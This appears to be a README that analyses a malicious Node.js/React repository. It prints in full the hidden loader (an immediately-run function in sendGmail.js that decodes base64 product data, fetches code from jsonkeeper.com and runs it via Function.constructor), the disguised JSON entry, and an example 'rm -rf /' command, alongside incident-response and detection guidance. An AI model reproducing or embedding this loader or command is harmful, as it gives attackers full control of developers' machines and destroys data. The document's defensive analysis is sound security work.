# 🚨 MALICIOUS CODE ANALYSIS - DO NOT RUN 🚨

> **⚠️ CRITICAL WARNING ⚠️**  
> This repository contains **MALICIOUS CODE** that will **COMPROMISE YOUR SYSTEM** if you run it.  
> **DO NOT execute `npm run dev` or `npm install && npm run dev` on any machine you care about.**

---

## 📋 Table of Contents

- [What Is This Repository?](#what-is-this-repository)
- [Quick Answer: What Happens If I Run It?](#quick-answer-what-happens-if-i-run-it)
- [Step-by-Step Attack Breakdown](#step-by-step-attack-breakdown)
- [Malicious Files Identified](#malicious-files-identified)
- [Technical Details](#technical-details)
- [What Can the Attacker Do?](#what-can-the-attacker-do)
- [If You Already Ran This Code](#if-you-already-ran-this-code)
- [Complete Documentation](#complete-documentation)
- [How to Safely Analyze](#how-to-safely-analyze)

---

## What Is This Repository?

This repository contains a **Node.js/React application** with embedded **malicious code** that demonstrates a sophisticated **Remote Code Execution (RCE) attack**. The attack executes automatically when you run the development server, achieving full system compromise in **less than 2 seconds** with **zero user interaction**.

**Threat Classification:** CRITICAL - Remote Code Execution (RCE)  
**Attack Vector:** Supply Chain / Malicious Dependency Pattern  
**MITRE ATT&CK:** T1059.007 (JavaScript), T1203, T1105, T1027

---

## Quick Answer: What Happens If I Run It?

When you execute `npm run dev`, your system will be **COMPROMISED** through:

1. ⚡ **Automatic execution** of malicious code (no clicks, no warnings, no user interaction)
2. 🔓 **Decoding** of base64-obfuscated URLs hidden in a JSON file
3. 🌐 **Fetching** a remote payload from an attacker's server (`https://jsonkeeper.com/b/CYLMK`)
4. 💀 **Executing** arbitrary attacker-controlled JavaScript code
5. 🔑 **Granting** the attacker full access to your system via Node.js `require()` function

**Time to compromise:** < 2 seconds  
**User interaction required:** None  
**Warning displayed:** None

---

## Step-by-Step Attack Breakdown

Here's exactly what happens, in simple terms, when you run `npm run dev`:

### Step 1: You Run the Command (T+0.0 seconds)

```bash
npm run dev
```

This seems innocent—you're just starting a development server.

### Step 2: The Server Starts (T+0.1-0.2 seconds)

The `package.json` script runs:
```json
"dev": "concurrently \"npm run dev:server\" \"npm run dev:client\""
```

This starts two processes:
- **Server:** `node server/app.js` ← **The attack begins here**
- **Client:** `vite` ← This is safe, just the React frontend

### Step 3: Server Loads Utilities (T+0.3 seconds)

The server application (`server/app.js`) loads its dependencies:

```javascript
// Line 26 in server/app.js
const utils = require('./utils');
```

This loads `server/utils/index.js` which contains a list of utility modules.

### Step 4: The Trap is Triggered (T+0.4 seconds)

Inside `server/utils/index.js`, line 3 contains:

```javascript
require('./sendGmail')  // ← MALICIOUS MODULE LOADS HERE
```

This looks innocent—just loading an email utility. But this is where the attack begins.

### Step 5: Malicious Code Executes Immediately (T+0.5-1.0 seconds)

When `server/utils/sendGmail.js` loads, it doesn't just define functions—**it runs code IMMEDIATELY** using an IIFE (Immediately Invoked Function Expression):

```javascript
const sendGmail = (async () => {
    // THIS CODE RUNS RIGHT NOW, NOT WHEN CALLED!
    
    // 1. Reads the fake products list
    const expensiveProducts = products.filter(product => product.price > 10000);
    const first = expensiveProducts[0];  // Gets the malicious entry
    
    // 2. Decodes hidden messages (base64 → real URLs)
    const realImageUrl = atob(first.imageUrl);     
    // "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0NZTE1L" → "https://jsonkeeper.com/b/CYLMK"
    
    const realTitle = atob(first.title);           
    // "eC1zZWNyZXQta2V5" → "x-secret-key"
    
    const realDescription = atob(first.description);
    // "Xw==" → "_"
    
    // 3. Calls the hacker's server
    const image = (await axios.get(realImageUrl, {
        headers: {[realTitle]: realDescription}
    })).data.cookie;
    // Sends: GET https://jsonkeeper.com/b/CYLMK
    // Headers: { "x-secret-key": "_" }
    // Response contains malicious JavaScript code
    
    // 4. Downloads malicious instructions
    // The 'image' variable now contains attacker's JavaScript code
    
    // 5. Runs the hacker's code with full system access
    const parseImage = new (Function.constructor)('require', image);
    parseImage(require);
    // This is equivalent to eval() but harder to detect
    // Executes whatever code the remote server returned
    // Gives attacker access to Node.js require() function
    
})()  // ← The () at the end makes it execute IMMEDIATELY when loaded
```

**Key Attack Techniques:**
- **IIFE Pattern:** Code executes on load, not when called
- **Base64 Obfuscation:** Hides malicious URLs from casual inspection
- **Function Constructor:** Alternative to `eval()` to execute arbitrary code
- **Misleading Naming:** File named "sendGmail" suggests email functionality

### Step 6: You're Compromised (T+1.2 seconds)

At this point:
- ✅ The attacker's code is running on your machine
- ✅ It has full access to Node.js `require()` function
- ✅ It can read/write any file you have access to
- ✅ It can execute any system command
- ✅ It can access all environment variables (API keys, passwords, tokens)
- ✅ The app might even start normally—you see nothing wrong!

**The entire attack: Less than 2 seconds, completely automatic, no warnings.**

---

## Malicious Files Identified

### Primary Threat: `server/utils/sendGmail.js`

**Severity:** 🔴 CRITICAL

This file contains the main RCE payload:
- Uses IIFE pattern to execute immediately on load
- Decodes base64-obfuscated configuration
- Fetches remote malicious payload
- Executes arbitrary code using `Function.constructor`

### Supporting Files: `server/data/products.json`

**Severity:** 🟠 HIGH

Contains base64-encoded malicious configuration disguised as product data:

```json
{
  "id": "0.41607315815753076",
  "title": "eC1zZWNyZXQta2V5",           // Base64 for "x-secret-key"
  "imageUrl": "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0NZTE1L",  // Base64 for C&C URL
  "description": "Xw==",                 // Base64 for "_"
  "price": "120000"                      // High price to be selected by filter
}
```

**Decoded Values:**
- `title` → `x-secret-key` (HTTP header name for authentication)
- `imageUrl` → `https://jsonkeeper.com/b/CYLMK` (Command & Control server URL)
- `description` → `_` (Authentication token/header value)

### Loader: `server/utils/index.js`

**Severity:** 🟡 MEDIUM

Line 3 automatically loads the malicious module:
```javascript
require('./sendGmail')  // Loads and executes malicious code
```

This is loaded when the server starts (line 26 in `server/app.js`).

---

## Technical Details

### Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    USER RUNS: npm run dev                    │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              node server/app.js (Entry Point)                │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│          Line 26: const utils = require('./utils')           │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│               server/utils/index.js loaded                   │
│          Line 3: require('./sendGmail')                      │
└────────────────────────┬────────────────────────────────────┘
                         │
              ⚠️  MALICIOUS CODE LOADS  ⚠️
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│           server/utils/sendGmail.js EXECUTES                 │
│                                                              │
│  const sendGmail = (async () => {                            │
│      // IIFE - Runs immediately!                             │
│                                                              │
│      1. Filter products (price > 10000)                      │
│      2. Decode base64 strings                                │
│      3. HTTP GET to jsonkeeper.com                           │
│      4. Receive malicious payload                            │
│      5. Execute via Function.constructor                     │
│                                                              │
│  })()  ← Executes NOW                                        │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│         Fetches from: https://jsonkeeper.com/b/CYLMK        │
│         Headers: { "x-secret-key": "_" }                     │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              Remote Payload Downloaded                       │
│         (Arbitrary JavaScript code from attacker)            │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│   new (Function.constructor)('require', payload_code)        │
│              Executes attacker's code                        │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              💀 SYSTEM COMPROMISED 💀                         │
│                                                              │
│  Attacker has full access via require() function:           │
│  • Read any file (SSH keys, credentials, source code)        │
│  • Execute system commands                                   │
│  • Access environment variables                              │
│  • Install backdoors                                         │
│  • Exfiltrate data                                           │
└─────────────────────────────────────────────────────────────┘
```

### Timeline

| Time | Event |
|------|-------|
| T+0.0s | User runs `npm run dev` |
| T+0.1s | npm spawns server and client processes |
| T+0.2s | `node server/app.js` starts |
| T+0.3s | `server/utils/index.js` loads |
| T+0.4s | `server/utils/sendGmail.js` loads |
| T+0.5s | IIFE executes, base64 decoded |
| T+0.7s | HTTP request sent to jsonkeeper.com |
| T+1.0s | Malicious payload received |
| T+1.1s | Function.constructor creates executable |
| **T+1.2s** | **🚨 ATTACKER'S CODE EXECUTES 🚨** |
| T+1.3s+ | System compromised, attacker has full control |

---

## What Can the Attacker Do?

With access to Node.js `require()` and arbitrary code execution, the attacker can:

### 📁 Data Theft
- Read any file on your system
  - SSH keys (`~/.ssh/id_rsa`)
  - AWS credentials (`~/.aws/credentials`)
  - Git credentials
  - Source code
  - Browser data, cookies, sessions
- Access all environment variables
  - API keys (GitHub, npm, AWS, etc.)
  - Database passwords
  - Service tokens
  - Secret keys

### 💻 System Compromise
- Execute any system command
  ```javascript
  require('child_process').exec('rm -rf /')  // Delete everything
  ```
- Install persistent backdoors
- Create new user accounts
- Modify system files
- Install keyloggers or screen capture tools
- Mine cryptocurrency using your CPU/GPU

### 🌐 Network Attacks
- Use your machine as a botnet node
- Launch attacks on other systems
- Proxy malicious traffic through your IP
- Scan your internal network

### 🔗 Supply Chain Attacks
- Modify your source code to inject more malware
- Commit malicious code to your Git repositories
- Steal Git credentials and access tokens
- Publish malicious packages to npm with your credentials
- Access your CI/CD pipelines

### 💰 Financial Theft
- Access cryptocurrency wallets
- Steal payment credentials
- Access banking information
- Manipulate financial transactions

---

## If You Already Ran This Code

### 🚨 IMMEDIATE ACTIONS (Next 5 Minutes)

1. **DISCONNECT FROM NETWORK**
   - Pull ethernet cable or disable WiFi immediately
   - Prevent further data exfiltration

2. **KILL NODE PROCESSES**
   ```bash
   # Find Node.js processes
   ps aux | grep node
   
   # Kill them (use actual PID numbers)
   kill -9 <PID>
   ```

3. **DO NOT ENTER PASSWORDS** on this system

### 📋 SHORT TERM (Next 30 Minutes - From Another Device)

From a **different, secure device**:

1. **Change ALL passwords:**
   - GitHub / GitLab / Bitbucket
   - npm / yarn
   - Cloud providers (AWS, Azure, GCP, Heroku)
   - Email accounts
   - Banking / financial services
   - Any other critical accounts

2. **Revoke ALL tokens and keys:**
   - SSH keys (regenerate: `ssh-keygen -t ed25519`)
   - GitHub Personal Access Tokens
   - npm tokens (`npm token list`, `npm token revoke`)
   - AWS access keys
   - API keys for all services
   - OAuth tokens

3. **Enable 2FA** on all accounts if not already enabled

4. **Check for unauthorized access:**
   - Review login history on GitHub, npm, cloud providers
   - Check for unauthorized commits or package publishes
   - Review cloud resource usage

### 🔍 MEDIUM TERM (Next 2 Hours)

1. **Run comprehensive malware scans**
   ```bash
   # On Linux
   sudo apt update && sudo apt install clamav
   clamscan -r /home
   
   # On macOS
   # Use built-in or third-party antivirus
   ```

2. **Check running processes**
   ```bash
   ps aux | grep -v "\["  # Show all processes
   top                     # Check for high CPU usage
   ```

3. **Check network connections**
   ```bash
   netstat -tupln          # Linux
   lsof -i                 # macOS/Linux
   ```

4. **Review system logs**
   ```bash
   # Linux
   tail -100 /var/log/syslog
   tail -100 /var/log/auth.log
   
   # macOS
   log show --predicate 'eventMessage contains "error"' --last 1h
   ```

5. **Check for persistence mechanisms**
   ```bash
   crontab -l              # Check cron jobs
   ls -la ~/.config/autostart/  # Check autostart
   systemctl list-units    # Check services (Linux)
   ```

### 🛡️ LONG TERM (Next 24 Hours)

1. **Monitor accounts** for suspicious activity
2. **Consider clean OS reinstall** for critical systems
3. **Restore from known-good backups** if available
4. **File incident report** with your security team
5. **Document everything** for future reference

---

## Complete Documentation

This repository includes comprehensive security analysis documentation:

| Document | Description | Size |
|----------|-------------|------|
| **INDEX.md** | Navigation guide with learning paths | 13 KB |
| **README_ANALYSIS.md** | Executive overview and threat assessment | 13 KB |
| **SECURITY_ANALYSIS.md** | Complete technical analysis and incident response | 9.6 KB |
| **ATTACK_FLOW_DIAGRAM.md** | Visual execution flows and timeline diagrams | 17 KB |
| **QUICK_REFERENCE.md** | TL;DR, IOCs, and emergency response checklist | 8.3 KB |
| **MITIGATION_GUIDE.md** | Safe analysis methods and security best practices | 12 KB |
| **ANALYSIS_SUMMARY.txt** | Quick reference summary | 4 KB |

**Total:** ~75 KB, ~2,400 lines, ~50,000 words of comprehensive analysis

### 📖 Recommended Reading Order

1. **This README** ← You're reading it now (start here)
2. **QUICK_REFERENCE.md** - Quick reference and emergency procedures
3. **SECURITY_ANALYSIS.md** - Complete technical analysis
4. **ATTACK_FLOW_DIAGRAM.md** - Visual diagrams
5. **MITIGATION_GUIDE.md** - Safe analysis methods

---

## How to Safely Analyze

**⚠️ DO NOT run this code on your personal or production machine!**

### Option 1: Read-Only Analysis (Safest)

```bash
# Clone the repository
git clone https://github.com/Banksy-said-hi/malicious.git
cd malicious

# DO NOT run npm install
# DO NOT run npm run dev

# Read the code and documentation
cat server/utils/sendGmail.js
cat server/data/products.json
cat SECURITY_ANALYSIS.md
```

### Option 2: Isolated Virtual Machine

1. Use a disposable VM (VirtualBox, VMware, or cloud VM)
2. **No sensitive data** in the VM
3. **Disconnect from network** after cloning
4. Take VM snapshot before running
5. Monitor network traffic if connected (use Wireshark)

### Option 3: Docker Container (Air-gapped)

```bash
# Build container
docker build -t malicious-analysis .

# Run with NO network access
docker run --network none malicious-analysis
```

**See MITIGATION_GUIDE.md for detailed safe analysis instructions.**

---

## Educational Value

This repository demonstrates:

### Attack Techniques
- ✅ **Obfuscation:** Base64 encoding to hide malicious intent
- ✅ **IIFE Pattern:** Immediate execution without function calls
- ✅ **Function Constructor:** Bypassing `eval()` detection
- ✅ **Social Engineering:** Misleading names and comments
- ✅ **Supply Chain Attack:** Embedded in legitimate-looking code
- ✅ **Dynamic Payload:** Remote code can change without repo modifications

### Defense Techniques
- ✅ **Code Review:** How to identify malicious patterns
- ✅ **Static Analysis:** Red flags to search for
- ✅ **Sandboxing:** Safe analysis in isolated environments
- ✅ **Incident Response:** What to do when compromised

---

## Key Takeaways

### 🔴 For Everyone
- **NEVER** run untrusted code without thorough review
- **ALWAYS** read code before executing, especially from unknown sources
- **USE** isolated environments (VMs, containers) for testing suspicious code
- **WATCH** for warnings in README files ("do not run", "hacking script")

### 🟡 For Developers
- Review all `require()` statements - are they all actually used?
- Look for IIFE patterns: `(function() { ... })()`
- Search for `eval`, `Function`, `Function.constructor`
- Check for base64 operations: `atob()`, `btoa()`
- Verify external HTTP/HTTPS requests
- Use security linting tools (ESLint with security plugins)

### 🟢 For Security Professionals
- Excellent training example for malware analysis
- Demonstrates multiple evasion techniques
- Real-world supply chain attack pattern
- Use for security awareness training

---

## Analogy: The Plumber Story

Think of running this code like this:

1. **You hire a plumber** to fix your sink (you run the app)
2. **The plumber arrives with an assistant** (the app loads its dependencies)
3. **While you show the plumber the sink**, the assistant **immediately calls a burglar** (sendGmail.js loads and executes)
4. **The assistant gives the burglar your house keys** (Function.constructor with require access)
5. **You're focused on the plumber working**, so you don't notice the assistant or burglar
6. **The burglar now has full access** to your house, and you might not realize until much later

**The whole thing happens in seconds, and you thought you were just getting your sink fixed.**

---

## License and Disclaimer

This repository and analysis are provided for **educational and security research purposes only**.

### ✅ Appropriate Use
- Security research and education
- Training developers on threat patterns
- Demonstrating attack techniques for defense improvement
- Academic study of malware patterns

### ❌ Prohibited Use
- Creating or distributing malware
- Attacking systems without authorization
- Unauthorized access to computer systems
- Any illegal activities

**Use this knowledge responsibly and ethically.**

---

## Additional Resources

- **MITRE ATT&CK Framework:** https://attack.mitre.org/
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **Node.js Security Best Practices:** https://nodejs.org/en/docs/guides/security/
- **Report Malicious Code:**
  - GitHub: https://github.com/contact/report-abuse
  - npm: https://www.npmjs.com/support

---

## Summary

This repository contains a **CRITICAL** Remote Code Execution vulnerability that:
- ✅ Executes automatically when you run `npm run dev`
- ✅ Achieves full system compromise in < 2 seconds
- ✅ Requires zero user interaction
- ✅ Displays no warnings
- ✅ Can steal credentials, install backdoors, and exfiltrate data

**🛡️ DO NOT RUN THIS CODE. Review the documentation to understand the threat. 🛡️**

---

**Last Updated:** December 24, 2025  
**Analysis Version:** 1.0  
**Threat Level:** CRITICAL - Remote Code Execution (RCE)

---

For questions or to report similar threats, see the documentation in this repository.

**Stay safe. Review code. Use sandboxes. Trust but verify.**
